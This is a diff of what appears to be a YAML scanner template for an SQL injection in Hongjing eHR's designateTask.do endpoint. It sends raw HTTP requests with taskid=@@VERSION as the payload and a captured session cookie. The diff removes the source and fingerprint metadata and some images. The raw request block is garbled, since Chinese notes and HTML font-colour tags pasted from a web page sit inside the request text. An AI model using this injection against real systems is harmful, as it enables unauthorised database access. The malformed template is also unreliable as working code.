@@ -3,12 +3,8 @@ info:
   name: 宏景eHR designateTask.do 存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/tid7y5tage5n0tgd'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: tid7y5tage5n0tgd
-    fofa: app="HJSOFT-HCM"
 http:
 - raw:
   - 'GET /module/system/qrcard/mobilewrite/qrcardmain.jsp HTTP/1.1
@@ -25,7 +21,7 @@ http:
 
     Accept-Encoding: gzip, deflate
 
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1758455505924-23037d0e-83ab-4104-a6fc-69ac8140d151.png)携带cookie进行注入
+    携带cookie进行注入
 
 
     **<font style="color:rgb(213, 97, 97);">GET</font>**<font style="color:rgb(53, 54, 57);"> </font><font style="color:rgb(90, 93, 100);">/performance/objectiveManage/designateTask.do?</font>**<font style="color:rgb(210, 105, 0);">b_save</font>**<font style="color:rgb(90, 93, 100);">=</font><font style="color:rgb(53, 54, 57);">&</font>**<font style="color:rgb(210, 105, 0);">taskid</font>**<font style="color:rgb(90, 93, 100);">=</font>**<font style="color:rgb(168, 61, 170);">@@VERSION</font>**<font style="color:rgb(53, 54, 57);"> </font>**<font style="color:rgb(55, 153, 105);">HTTP/1.1</font>**
@@ -42,10 +38,7 @@ http:
 
     <font style="color:rgb(41, 107, 197);">Accept-Encoding</font><font style="color:rgb(53, 54, 57);">: </font><font style="color:rgb(90, 93, 100);">gzip,</font><font style="color:rgb(53, 54, 57);"> </font><font style="color:rgb(90, 93, 100);">deflate</font>
 
-    **<font style="color:rgb(41, 107, 197);">Cookie</font>**<font style="color:rgb(53, 54, 57);">: 获取的cookie</font>
-
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1758455506190-0738ffa4-3960-46cf-9b64-17f85368a417.png)'
+    **<font style="color:rgb(41, 107, 197);">Cookie</font>**<font style="color:rgb(53, 54, 57);">: 获取的cookie</font>'
   redirects: false
   matchers:
   - status:
